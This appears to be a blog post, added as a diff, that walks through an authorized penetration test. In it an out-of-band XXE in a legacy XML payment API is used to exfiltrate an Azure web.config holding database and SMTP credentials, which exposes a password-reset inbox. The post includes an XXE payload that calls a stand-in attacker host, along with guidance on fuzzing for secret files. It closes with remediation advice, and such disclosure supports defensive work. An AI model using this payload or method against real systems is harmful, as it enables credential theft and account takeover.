@@ -1,0 +1,107 @@
+---
+title: "Compromising an Azure Tenant via XXE OOB and web.config Exfiltration"
+date: "2025-05-26"
+dateLabel: "May 26, 2025"
+description: "An exposed API documentation directory, an out-of-band XXE, and Azure App Service path mappings that together exposed a corporate mailbox used for password resets."
+tags: ["XXE", "Azure", "OOB", "Cloud Security", "Web"]
+---
+
+## How to Approach XXE Testing
+
+XXE vulnerabilities are easy to miss if you are only looking at JSON APIs. They live in XML parsers, and XML is more common than people expect: SOAP endpoints, document upload features, data import flows, RSS and Atom feeds, office file formats, and legacy transactional APIs. Any place where the application accepts and parses XML is worth probing.
+
+The first test is always a basic external entity reference. Point it at a domain you control using Burp Collaborator or an OAST service and see if you get a callback. If you do, the parser is resolving external entities and you have confirmed XXE. The response does not need to contain any data at this stage — the DNS or HTTP ping is enough.
+
+When the response does not reflect data back to you, that does not mean the vulnerability is unexploitable. Out-of-band exfiltration works by defining an external DTD that reads a local file and sends its contents as a parameter to your listener. The data travels in a DNS lookup or HTTP request rather than in the HTTP response, which is why it bypasses filters that only look at what the server returns.
+
+For file path selection on Windows IIS targets, start with `C:\inetpub\wwwroot\web.config`. If that returns nothing, check the Azure Portal for custom path mappings under App Service configuration. Mount points redirect the app's file structure to specific Azure File shares, and the actual files may be at non-standard paths that require some enumeration to find.
+
+Do not rely on the principal directory alone. Fuzz variations of high-value filenames like `web.config`, `appsettings.json`, and `secrets.env` across every mount path you can identify. One of them will eventually respond.
+
+## Background
+
+This engagement was a two-week assessment for a transactional company fully hosted in Microsoft Azure. The scope covered both an external black-box evaluation of all publicly exposed services and an authenticated gray-box assessment with least-privilege reader access to the Azure subscription. That combination ended up being the key detail.
+
+The early part of the assessment went as expected. We found overly permissive CORS policies on several subdomains, SQL injection points, and exposed personally identifiable information. Serious findings, but not unusual. What came next was different.
+
+## Finding the Entry Point
+
+During manual inspection of publicly accessible resources, we found an exposed WordPress directory at `/wp-content/` on one of the subdomains. Inside it was detailed API documentation for a legacy transactional endpoint used for payment processing. The documentation described every field the API accepted and how the server processed incoming requests.
+
+The API accepted XML-formatted requests. That alone is a flag worth following.
+
+Armed with the documented request structure, we began crafting payloads. After several rounds of testing and adjustment, we confirmed that the server was parsing XML without disabling external entity resolution. More importantly, we got an out-of-band callback to our OAST collaborator, confirming that the server would reach out to attacker-controlled infrastructure when processing our payloads.
+
+<Concept>
+An **XML External Entity (XXE)** injection occurs when an XML parser processes user-supplied input that includes a reference to an external entity. If the parser resolves external entities without restriction, an attacker can use this to read local files, trigger server-side requests, or exfiltrate data to an external listener. **Out-of-Band XXE** is the variant where the exfiltrated data does not appear in the HTTP response. Instead, the server is made to send the data to an attacker-controlled endpoint through a secondary channel, typically a DNS lookup or HTTP request, making it much harder to detect and block.
+</Concept>
+
+<FlowChart
+  title="XXE OOB to Azure Tenant Compromise Attack Chain"
+  steps={[
+    { label: "Recon", title: "Exposed /wp-content/ with API docs", subtitle: "Legacy XML payment endpoint documented", tone: "neutral" },
+    { label: "Step 1", title: "XXE OOB confirmed", subtitle: "OAST callback received from server", tone: "warn" },
+    { label: "Step 2", title: "Azure path mappings identified", subtitle: "Reader access reveals mount points", tone: "neutral" },
+    { label: "Step 3", title: "web.config exfiltrated via OOB XXE", subtitle: "DB credentials + SMTP credentials exposed", tone: "warn" },
+    { label: "Result", title: "Email access + OTP interception", subtitle: "", tone: "critical" },
+  ]}
+/>
+
+## The XXE Payload
+
+The payload that confirmed the vulnerability was a classic OOB trigger. We embedded an external entity reference pointing at our Burp Collaborator domain inside a valid request that matched the documented API format.
+
+```
+<!DOCTYPE test [
+  <!ENTITY xxe SYSTEM "http://attacker.oastify.com">
+]>
+<stockCheck>
+  <productId>&xxe;</productId>
+  <storeId>1</storeId>
+</stockCheck>
+```
+
+The callback arrived on our collaborator client almost immediately. The server reached out to our domain when processing the request, which confirmed the parser was expanding external entities. At this point we had a confirmed XXE OOB and the question shifted from whether to how far we could take it.
+
+## Escalation via Azure Path Mappings
+
+Initial attempts to exfiltrate files from the default IIS paths returned limited results. The principal directory did not contain anything immediately useful. This is where the gray-box access became critical.
+
+With reader-level access to the Azure subscription, we opened the App Service blade in the Azure Portal and examined the configuration of the vulnerable app. Under Configuration and Path Mappings, we found custom mount points that redirected parts of the application's file structure to Azure File shares. These were paths we would never have found through blind fuzzing alone.
+
+<Concept>
+**Azure App Service path mappings** allow the application to mount external storage, such as Azure File shares or Blob containers, at specific virtual paths within the app's file system. From a security standpoint, these mounts often contain configuration files and secrets that are managed separately from the app's source code, which means they may not follow the same hardening practices applied to the main deployment.
+</Concept>
+
+Knowing the exact mount paths, we switched to aggressive fuzzing of high-value filenames across each of those directories. We tried variations of `web.config`, `appsettings.json`, and `secrets.env` at each path. One of the payloads eventually returned data through our OOB listener. A complete `web.config` file came through.
+
+## What the web.config Contained
+
+The file included production database connection strings with plaintext credentials and SMTP server login credentials for a sender account used in automated workflows. That second item was the one that changed the severity of the finding.
+
+We tested the SMTP credentials and confirmed they provided access to a functioning corporate email account. Inside that inbox were emails related to password reset flows, OTP deliveries, and sensitive operational correspondence. The account was tied to the authentication system for end users, meaning it was involved in every password recovery and account verification action on the platform.
+
+The implications were significant. With access to that inbox, an attacker could intercept OTPs and password reset links for any user account, effectively enabling full account takeover at scale without needing to touch the application directly.
+
+The web.config also contained database credentials. We attempted to connect but the server was protected by IP whitelisting. Without an allowed source IP, the database would not respond. We considered options like routing through the compromised app or rotating outbound IPs through cloud services, but the engagement window was closing. We documented the vector and moved on, leaving it as a finding with confirmed credential exposure and unconfirmed database access.
+
+## Impact
+
+- Full read access to a corporate email account involved in password recovery and OTP delivery for all users
+- Ability to intercept one-time passwords and password reset links for any account on the platform
+- Production database credentials extracted, with access blocked only by IP whitelisting
+- Potential for lateral movement through internal email phishing from a trusted sender identity
+
+## Remediation
+
+- Disable external entity resolution in all XML parsers by default — set `XmlResolver` to null
+- Remove internal API documentation from publicly accessible directories
+- Store secrets in Azure Key Vault, not in `web.config` or `.env` files
+- Audit and restrict path mappings to limit exposure of sensitive file systems through mounted shares
+- Rotate all credentials found in the exfiltrated configuration file immediately
+- Apply stricter access controls to email accounts used in automated authentication workflows
+- Enforce network-level restrictions on database access beyond IP whitelisting alone
+
+---
+
+*Vulnerability details have been generalized to protect client confidentiality. All findings were reported and remediated as part of the engagement.*
